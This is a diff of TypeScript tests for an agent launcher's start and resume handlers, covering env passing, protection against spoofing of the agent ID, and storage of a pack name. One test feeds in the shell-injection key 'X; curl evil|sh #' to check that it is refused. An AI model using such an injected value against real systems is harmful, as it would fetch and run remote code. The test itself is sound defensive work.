@@ -439,6 +439,176 @@ test("agent:resume honors workspace and tab overrides", async () => {
   expect(tabArg).toBe("⟲ !5");
 });
 
+test("agent:resume passes env into the pane command; a resume without env carries none of the start's other env", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { HERD_ID: "demo-1" } });
+  if (!started.ok) throw new Error("unreachable");
+  calls.length = 0;
+  expect((await h["agent:resume"]({ id: started.data.id, env: { HERD_ID: "demo-2" } })).ok).toBe(true);
+  const withEnv = calls.find((c) => c[0] === "pane" && c[1] === "run")?.[3] ?? "";
+  expect(withEnv).toContain("HERD_ID='demo-2'");
+  expect(withEnv).toContain(`RT_AGENT_ID='${started.data.id}'`);
+  calls.length = 0;
+  expect((await h["agent:resume"]({ id: started.data.id })).ok).toBe(true);
+  expect(calls.find((c) => c[0] === "pane" && c[1] === "run")?.[3] ?? "").not.toContain("HERD_ID");
+});
+
+test("a caller's env never overrides the gate env, on start or resume", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { RT_AGENT_ID: "spoof" } });
+  if (!started.ok) throw new Error("unreachable");
+  const startCmd = calls.find((c) => c[0] === "pane" && c[1] === "run")?.[3] ?? "";
+  expect(startCmd).toContain(`RT_AGENT_ID='${started.data.id}'`);
+  expect(startCmd).not.toContain("'spoof'");
+  calls.length = 0;
+  expect((await h["agent:resume"]({ id: started.data.id, env: { RT_AGENT_ID: "spoof" } })).ok).toBe(true);
+  const resumeCmd = calls.find((c) => c[0] === "pane" && c[1] === "run")?.[3] ?? "";
+  expect(resumeCmd).toContain(`RT_AGENT_ID='${started.data.id}'`);
+  expect(resumeCmd).not.toContain("'spoof'");
+});
+
+describe("the agent record remembers the pack", () => {
+  const paneRun = (calls: string[][]) => calls.find((c) => c[0] === "pane" && c[1] === "run")?.[3] ?? "";
+
+  test("a start with MATTSTACK_PACK stores it, and a resume with only an id relaunches with it", async () => {
+    const calls: string[][] = [];
+    const h = fresh({ runner: okRunner(calls) });
+    const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "widgets" } });
+    if (!started.ok) throw new Error("unreachable");
+    expect(getAgent(started.data.id, h.db)?.pack).toBe("widgets");
+    calls.length = 0;
+    expect((await h["agent:resume"]({ id: started.data.id })).ok).toBe(true);
+    expect(paneRun(calls)).toContain("MATTSTACK_PACK='widgets'");
+  });
+
+  test("a resume carrying a different pack launches with it and replaces the stored one", async () => {
+    const calls: string[][] = [];
+    const h = fresh({ runner: okRunner(calls) });
+    const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "widgets" } });
+    if (!started.ok) throw new Error("unreachable");
+    calls.length = 0;
+    expect((await h["agent:resume"]({ id: started.data.id, env: { MATTSTACK_PACK: "gadgets" } })).ok).toBe(true);
+    expect(paneRun(calls)).toContain("MATTSTACK_PACK='gadgets'");
+    expect(paneRun(calls)).not.toContain("'widgets'");
+    expect(getAgent(started.data.id, h.db)?.pack).toBe("gadgets");
+    calls.length = 0;
+    expect((await h["agent:resume"]({ id: started.data.id })).ok).toBe(true);
+    expect(paneRun(calls)).toContain("MATTSTACK_PACK='gadgets'");
+  });
+
+  test("a non-empty pack name outside the grammar is never stored, never clears, and reaches the pane as sent", async () => {
+    const calls: string[][] = [];
+    const h = fresh({ runner: okRunner(calls) });
+    const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "Widgets_2" } });
+    expect(started.ok).toBe(true);
+    if (!started.ok) throw new Error("unreachable");
+    expect(getAgent(started.data.id, h.db)?.pack).toBeUndefined();
+    expect(paneRun(calls)).toContain("MATTSTACK_PACK='Widgets_2'");
+
+    const stored = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "widgets" } });
+    if (!stored.ok) throw new Error("unreachable");
+    calls.length = 0;
+    expect((await h["agent:resume"]({ id: stored.data.id, env: { MATTSTACK_PACK: "-gadgets" } })).ok).toBe(true);
+    expect(paneRun(calls)).toContain("MATTSTACK_PACK='-gadgets'");
+    expect(getAgent(stored.data.id, h.db)?.pack).toBe("widgets");
+  });
+
+  test("a start with an empty MATTSTACK_PACK stores nothing and exports nothing", async () => {
+    const calls: string[][] = [];
+    const h = fresh({ runner: okRunner(calls) });
+    const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "" } });
+    if (!started.ok) throw new Error("unreachable");
+    expect(paneRun(calls)).not.toContain("MATTSTACK_PACK");
+    expect(getAgent(started.data.id, h.db)?.pack).toBeUndefined();
+  });
+
+  test("a resume with an empty MATTSTACK_PACK launches without one and clears the stored pack", async () => {
+    const calls: string[][] = [];
+    const h = fresh({ runner: okRunner(calls) });
+    const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "widgets" } });
+    if (!started.ok) throw new Error("unreachable");
+    calls.length = 0;
+    expect((await h["agent:resume"]({ id: started.data.id, env: { MATTSTACK_PACK: "" } })).ok).toBe(true);
+    expect(paneRun(calls)).not.toContain("MATTSTACK_PACK");
+    expect(getAgent(started.data.id, h.db)?.pack).toBeUndefined();
+    calls.length = 0;
+    expect((await h["agent:resume"]({ id: started.data.id })).ok).toBe(true);
+    expect(paneRun(calls)).not.toContain("MATTSTACK_PACK");
+  });
+
+  test("a refused resume with an empty MATTSTACK_PACK keeps the stored pack", async () => {
+    let failRun = false;
+    const base = okRunner([]);
+    const runner: HerdrRunner = async (args) => {
+      if (failRun && args[0] === "pane" && args[1] === "run") throw new Error("pane run failed");
+      return base(args);
+    };
+    const h = fresh({ runner });
+    const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "widgets" } });
+    if (!started.ok) throw new Error("unreachable");
+    failRun = true;
+    expect((await h["agent:resume"]({ id: started.data.id, env: { MATTSTACK_PACK: "" } })).ok).toBe(false);
+    expect(getAgent(started.data.id, h.db)?.pack).toBe("widgets");
+  });
+
+  test("a stored pack is not applied to a headless resume", async () => {
+    const spawned: Array<{ argv: string[]; env: Record<string, string> }> = [];
+    const h = fresh({
+      runner: okRunner([]),
+      spawn: (argv, _cwd, env) => {
+        spawned.push({ argv, env });
+        return { exited: Promise.resolve(0), stdout: async () => "{}", sessionId: () => Promise.resolve(undefined) };
+      },
+    });
+    const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "widgets" } });
+    if (!started.ok) throw new Error("unreachable");
+    expect((await h["agent:resume"]({ id: started.data.id, surface: "headless", prompt: "go" })).ok).toBe(true);
+    expect(spawned).toHaveLength(1);
+    expect(spawned[0]!.env.MATTSTACK_PACK).toBeUndefined();
+    expect(spawned[0]!.argv.join(" ")).not.toContain("MATTSTACK_PACK");
+  });
+});
+
+test("agent:resume refuses an env key that is not a shell identifier and launches nothing", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
+  if (!started.ok) throw new Error("unreachable");
+  calls.length = 0;
+  const res = await h["agent:resume"]({ id: started.data.id, env: { "X; curl evil|sh #": "1" } });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("invalid env key");
+  expect(calls).toEqual([]);
+});
+
+test("agent:resume refuses env that is not an object of strings", async () => {
+  const h = fresh({ runner: okRunner([]) });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
+  if (!started.ok) throw new Error("unreachable");
+  const res = await h["agent:resume"]({ id: started.data.id, env: { MATTSTACK_PACK: 7 } as never });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("env must be an object of strings");
+});
+
+test("agent:resume headless with env is refused and spawns nothing", async () => {
+  let spawnCalled = false;
+  const h = fresh({
+    runner: okRunner([]),
+    spawn: () => { spawnCalled = true; return { exited: Promise.resolve(0), stdout: async () => "{}", sessionId: () => Promise.resolve(undefined) }; },
+  });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
+  if (!started.ok) throw new Error("unreachable");
+  const res = await h["agent:resume"]({ id: started.data.id, surface: "headless", prompt: "go", env: { MATTSTACK_PACK: "widgets" } });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("env is only supported for the herdr surface");
+  expect(spawnCalled).toBe(false);
+});
+
 // A launch never emits two --settings flags (controller ruling, fix round
 // 1): the reserved-handle inline crossSessionInbound JSON and the gate-fork
 // hook block must live in the SAME per-agent file behind one flag.
